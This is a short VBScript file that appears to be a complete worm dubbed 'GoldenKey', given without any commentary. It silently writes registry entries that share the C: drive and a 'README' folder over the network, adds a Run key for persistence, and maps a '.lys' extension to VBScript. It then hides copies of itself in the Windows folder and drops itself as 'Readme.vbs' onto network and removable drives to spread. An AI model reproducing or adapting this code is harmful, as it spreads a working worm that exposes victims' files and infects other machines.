On Error Resume Next
Set V1=CreateObject("Scripting.FileSystemObject")
Set V2=V1.GetSpecialFolder(WinDir)   
Set V3=WScript.CreateObject("WScript.Shell")
V4="HKLM\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\"
V5=Wscript.ScriptFullName
V3.RegWrite V4&"!\Flags",402,"REG_DWORD"
V3.RegWrite V4&"!\Type",0,"REG_DWORD"
V3.RegWrite V4&"!\Path","C:\"
V3.RegWrite V4&"!\Parm1enc",-1837192444,"REG_BINARY"
V3.RegWrite V4&"README!\Flags",401,"REG_DWORD"
V3.RegWrite V4&"README!\Type",0,"REG_DWORD"
V3.RegWrite V4&"README!\Path",V2&"\GoldenKey\Readme.vbs"
V3.RegWrite"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\GoldenKey",V2&"\GoldenKey.lys"
V3.RegWrite"HKCR\.lys\","VBSFile"
V1.CopyFile V5,V2&"\GoldenKey.lys"
V1.GetFile(V2&"\GoldenKey.lys").attributes=2
V1.CreateFolder V2&"\GoldenKey"
V1.CopyFile V5,V2&"\GoldenKey\Readme.vbs"
V1.GetFolder(V2&"\GoldenKey").attributes=2
Set dc=V1.Drives
For Each d in dc
If d.DriveType=3 Then
V1.CopyFile V5,d.DriveLetter&":\Readme.vbs"
ElseIf d.DriveType=1 And d.IsReady Then
V1.CopyFile V5,d.DriveLetter&":\Readme.vbs"
End If
Next